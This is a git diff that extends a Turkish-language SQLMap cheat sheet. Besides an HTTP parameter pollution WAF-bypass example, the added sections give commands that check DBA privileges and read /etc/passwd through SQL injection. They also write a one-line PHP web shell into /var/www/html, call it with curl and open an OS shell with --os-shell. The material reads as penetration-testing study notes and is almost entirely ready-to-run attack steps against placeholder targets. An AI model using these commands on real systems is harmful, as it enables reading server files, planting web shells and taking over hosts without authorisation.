@@ -326,6 +326,47 @@ HTTP Parametre Kirliliği anlamına gelen bu yöntem, enjeksiyon kodlarını ayn
 - Dağıtılmış İstek Örneği: `?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users`
 - Arka Plan Davranışı: WAF, her bir `id` parametresini bağımsız ve zararsız zanneder; ancak hedef web platformu bu parametreleri birleştirerek işlemi gerçekleştirir.
 
----
+## `is-dba` ile yetkilerimizi öğrenmek
 
-Bu dosya, SQLMap kullanımını ve farklı bypass / tarama tekniklerini markdown formatında düzenlenmiş şekilde özetler.
+```bash
+ sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
+```
+
++ **current user is DBA: `False`** ise yazma ve okuma iznimiz olmaz
++ **current user is DBA: `True`** ise yazma ve okuma iznimiz var demektir
+
+### Local Dosyaları okuma
+
+```bash
+ sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
+```
+
+### Local Dosyalara yazma
+
+Barındırma sunucusuna dosya yazma konusu, modern veritabanı yönetim sistemlerinde (DBMS) oldukça kısıtlanmıştır; zira bu özellik, uzak sunucuya bir "Web Shell" (web kabuğu) yerleştirmek, kod çalıştırmak ve sunucunun kontrolünü ele geçirmek için kullanılabilir.
+
+İşte bu nedenle, modern veritabanı sistemleri dosya yazma işlevini varsayılan olarak devre dışı bırakır ve veritabanı yöneticilerinin (DBA) dosya yazabilmesi için özel ayrıcalıklara sahip olmasını şart koşar. Örneğin MySQL'de, `INTO OUTFILE` SQL sorgusunu kullanarak yerel dosyalara veri yazabilmek için `--secure-file-priv` yapılandırmasının manuel olarak devre dışı bırakılması gerekir; ayrıca, hedef dizine yazma izni gibi, barındırma sunucusu üzerinde gerekli yerel erişim haklarına da sahip olunmalıdır.
+
+Buna rağmen, birçok web uygulaması veritabanı sistemlerinin dosyalara veri yazabilmesini gerektirir; dolayısıyla uzak sunucuya dosya yazıp yazamayacağımızı test etmekte fayda vardır. Bunu SQLMap ile gerçekleştirmek için `--file-write` ve `--file-dest` seçeneklerini kullanabiliriz. Öncelikle, basit bir PHP web kabuğu hazırlayalım ve bunu `shell.php` adlı bir dosyaya kaydedelim:
+
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' > shell.php;
+## sonra
+sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
+## sonra
+curl http://www.example.com/shell.php?cmd=id
+```
+
+
+## os command execution
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" --os-shell 
+```
+
+**error based sql inj daha sağlıklı eğer bu açık varsa --technique=E**
+
+```bash
+sqlmap -u "http://www.example.com/?id=1" --technique=E --os-shell 
+```
